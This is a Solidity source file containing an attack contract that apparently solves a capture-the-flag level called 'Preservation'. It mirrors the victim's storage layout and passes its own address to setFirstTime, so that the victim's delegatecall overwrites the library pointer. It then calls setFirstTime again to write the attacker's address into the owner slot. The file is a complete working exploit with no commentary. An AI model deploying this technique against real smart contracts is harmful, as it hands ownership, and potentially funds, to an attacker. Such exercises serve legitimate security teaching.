// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
}

contract HPreservation {
    //mimic storage layout of victim address
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    IPreservation public iPreservation;
    uint256 public contractAddressAsUint;
    uint256 public ownerAddressAsUint;

    constructor(address _victimAddress) public {
        iPreservation = IPreservation(_victimAddress);
        contractAddressAsUint = uint256(address(this));
        ownerAddressAsUint = uint256(msg.sender);
        //Change address to this contract
        iPreservation.setFirstTime(contractAddressAsUint);
    }

    function claimOwnership() public {
        iPreservation.setFirstTime(ownerAddressAsUint);
    }

    function setTime(uint256 _addressAsUint) public {
        owner = address(_addressAsUint);
    }
}
